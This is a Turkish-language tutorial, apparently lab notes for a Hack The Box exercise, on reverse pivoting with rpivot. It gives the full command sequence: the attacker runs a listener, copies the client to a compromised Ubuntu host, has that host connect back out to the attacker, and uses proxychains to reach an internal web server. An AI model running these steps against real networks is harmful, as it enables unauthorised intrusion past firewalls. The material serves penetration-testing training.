Normalde A (sen) B'ye bağlanıp tünel açıyordun. Burada ise **B (Pivot), A'ya (sana) bağlanıyor.** Neden? Çünkü belki B'nin güvenlik duvarı dışarıdan gelen bağlantıları engelliyor ama içeriden dışarıya çıkışa izin veriyor. 

Hemen A-B-C mantığıyla notlarını çıkarıyorum:

**Makineler:**
*   **A (Saldırgan):** Senin makinen (10.10.15.5)
*   **B (Pivot):** Ubuntu makinesi (Dış: 10.129.15.50, İç: 172.16.5.129)
*   **C (Hedef):** İç ağdaki Web Sunucusu (172.16.5.135)

### Adım Adım Rpivot Kullanımı

**1. Adım: Rpivot'u İndir (A Makinesinde)**
Aracı kendi makinene klonla:
```bash
git clone https://github.com/klsecservices/rpivot.git
```

**2. Adım: Sunucuyu Başlat (A Makinesinde)**
A makinesinde `server.py`'yi çalıştır. Bu komut, B'nin bağlanması için 9999 portunu dinler ve kendi üzerinde 9050 (SOCKS) portunu açar:
```bash
cd /opt/rpivot

python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

**3. Adım: Aracı B Makinesine Gönder (A'dan B'ye)**
İndirdiğin `rpivot` klasörünü `scp` ile B makinesine (Pivot) kopyala:
```bash
scp -r rpivot ubuntu@10.129.15.50:~/
```
*(Not: Görseldeki IP farklı olabilir, kendi HTB IP'ni yaz).*

**4. Adım: İstemciyi Çalıştır (B Makinesinde)**
B makinesine geç (SSH ile). `rpivot` klasörünün içine gir ve B makinesinin A'ya (sana) bağlanmasını sağla:
```bash
python2 client.py --server-ip 10.10.15.5 --server-port 9999
```
*(Bu komut B'den A'ya bir bağlantı başlatır. A'daki ekranda "New connection" yazısını görmelisin).*

**5. Adım: Proxychains Ayarı (A Makinesinde)**
A makinesinde `/etc/proxychains4.conf` dosyasını aç ve en alta şunu ekle (artık `socks4` kullanıyoruz):
```text
socks4 127.0.0.1 9050
```

**6. Adım: Hedefe Sız (A Makinesinde)**
Artık proxychains ile C makinesine (Web sunucusuna) bağlanabilirsin:
```bash
proxychains firefox-esr 172.16.5.135:80
```

---